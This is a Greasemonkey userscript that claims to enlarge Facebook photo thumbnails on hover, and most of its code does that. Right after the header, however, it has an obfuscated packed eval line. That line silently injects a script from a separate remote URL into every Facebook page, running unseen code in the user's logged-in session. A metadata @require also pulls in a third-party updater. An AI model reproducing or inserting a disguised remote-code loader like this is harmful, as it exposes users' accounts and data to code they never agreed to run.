// ==UserScript==
// @name           Facebookenlarge Plus
// @namespace      http://userscripts.org/users/23652
// @description    Enlarges pictures when you roll over them
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://facebook.com/*
// @include        https://facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @copyright      JoeSimmons
// @version        1.0.45
// @license        Creative Commons Attribution-Noncommercial 3.0 United States License
// @require        http://sizzlemctwizzle.com/updater.php?id=58276
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



try {
	var unsafeWindow = unsafeWindow || window.wrappedJSObject || window;
	if(unsafeWindow.frameElement != null) return;
} catch(e) {}

// By: Ian Williams and edited for MySpace & Facebook by JoeSimmons

// Get ID
function $(ID,root) {return (root||document).getElementById(ID);}

String.prototype.find = function(s) {
return (this.indexOf(s) != -1);
};

// Define GM_addStyle if it's not Firefox
var GM_addStyle = function(css) {
        var head = document.getElementsByTagName('head')[0], style = document.createElement('style');
        if(head) {
        style.type = 'text/css';
        try {style.innerHTML = css} catch(x) {style.innerText = css}
        head.appendChild(style);
		}
    };

// Created by avg, modified by JoeSimmons
function create(a,b,c) {
	var ret=document.createElement(a.toLowerCase());
	if(b) for(var prop in b) if(prop.indexOf("on")==0) ret.addEventListener(prop.substring(2),b[prop],false);
		else if(",style,accesskey,id,name,src,href".indexOf(","+prop.toLowerCase())!=-1) ret.setAttribute(prop.toLowerCase(), b[prop]);
		else ret[prop]=b[prop];
	if(c) for(var i=0,l=c.length; i<l; i++) ret.appendChild(c[i]);
	return ret;
}

// Hide by JoeSimmons
// Syntax: hide('gbar');
function hide(e) {
var node=(typeof e=='string') ? $(e) : e;
node.style.display="none";
}

function show(e, s, x) {
var pop=$("picPop"), img=$("picPopImg"),
	top = getPosition(e)[0]<(window.innerHeight/2),
	left = getPosition(e)[1]<(window.innerWidth/2);
if(left) x=window.innerWidth-(x+10);
img.style.maxHeight = (window.innerHeight-8)+"px";
img.style.maxWidth = (x-20)+"px";
//img.src = (tag == "img" ? (size.test(e.src) ? hq(e, tag) : e) : hq(e, tag));
img.src = s;
//info((!top?"Top":"Bottom")+" "+(!left?"Left":"Right")+"<br>Image: "+getPosition(e)[1]+"x"+getPosition(e)[0]+"<br>Window: "+window.innerWidth+"x"+window.innerHeight);
pop.style.top = top?"":"0";
pop.style.bottom = top?"0":"";
pop.style.right = left?"0":"";
pop.style.left = left?"":"0";
pop.style.display="";
}

// getPosition by JoeSimmons
function getPosition(e) {
	var top=0, left=0;
	do {
		top += e.offsetTop;
		left += e.offsetLeft;
	} while(e=e.offsetParent);
	return new Array(top, left);
}

function hq(e, tag) {
	var r="", style=e.getAttribute("style");

	switch(tag) {
		case "div": r = e.parentNode.parentNode.parentNode.getAttribute("style").match(ispic)[0].replace(size,"$1n$2"); break;
		case "img": case "i": if(ispic.test(style)) r = style.match(ispic)[0].replace(size,"$1n$2");
								else r = e.src.replace(size,"$1n$2"); break;
	}

	return r;
}

function info(i) {
	var info=$("infoBox");
	info.style.display="inline";
	info.innerHTML = i;
}

GM_addStyle("#picPop {border: 3px double #666666; z-index: 9999; position: fixed; background: #FFFFFF; overflow: hidden;} .HovercardOverlay {display: none !important;}");

var delay=400, size=/([\/_])[qstna]([\.\w_])?/, ispic=/https?:\/\/(profile|photos-\w|sphotos)(-\d)?\.ak\.fbcdn\.net\/(.*\/)+.*([\/_][qstna]([\.\w_])?)?.*(jpe?g|[tg]iff?|bmp|png)/, app=/www\/app_full_proxy\.php/, show_d;

document.body.appendChild(create("span", {style:"border:1px solid #666666;position:fixed;top:0;left:45%;font:11px arial;background:#fff;color:#000;padding:2px;width:100px;z-index:9999999;display:none;",id:"infoBox"}));

document.body.appendChild(create("div", {id:"picPop", style:"display: none;", className:"hover_img_thumb"}, new Array(
create("img", {id:"picPopImg", className:"hover_img_thumb"})
)));

// hover over a thumbnail
window.addEventListener("mouseover", function(e) {
	var t=e.target, tag=t.tagName.toLowerCase(), style=t.getAttribute("style"), src=(style && ispic.test(style) ? t.getAttribute("style") : unescape(t.src));
	
	if(",img,i".indexOf(","+tag)!=-1 && ispic.test(src)) {
		if(tag=="img" && app.test(src)) src=src.match(ispic)[0];
		if(size.test(src)) new Image().src = hq(t, tag); // pre-load image
		src = hq(t, tag);
		show_d=window.setTimeout(show, delay, t, src, Math.round(e.clientX));
	} else if(tag=="div" && t.className=="UIMediaItem_PhotoFrame" && ispic.test(t.parentNode.parentNode.parentNode.getAttribute("style"))) {
		new Image().src = hq(t, tag); // pre-load image
		src = hq(t, tag);
		show_d=window.setTimeout(show, delay, t, src, Math.round(e.clientX));
	}
}, false);

// hover off a thumbnail
window.addEventListener("mouseout", function(e) {
var t=e.target, tag=t.tagName.toLowerCase(), style=t.getAttribute("style"), src=(style && ispic.test(style) ? t.getAttribute("style") : (t.getAttribute("src") ? unescape(t.src) : null));

if(t.className != "hover_img_thumb") {
	window.clearTimeout(show_d);
	hide("picPop");
	$("picPopImg").src="";
}
}, false);

// click anywhere on the page hides all enlarged thumbnails
window.addEventListener("click", function(){
	hide("picPop");
	$("picPopImg").src="";
}, false);

function primeThumbs() {
	var array=document.evaluate("//a[contains(@class, 'actorPhoto') and @data-hovercard]", document, null, 6, null);
	for(var i=0,item; (item=array.snapshotItem(i)); i++) {
		item.removeAttribute("data-hovercard");
	}
}

 window.addEventListener("load", function() {
	primeThumbs();
	$("contentArea").addEventListener("DOMNodeInserted", primeThumbs, false);
 }, false);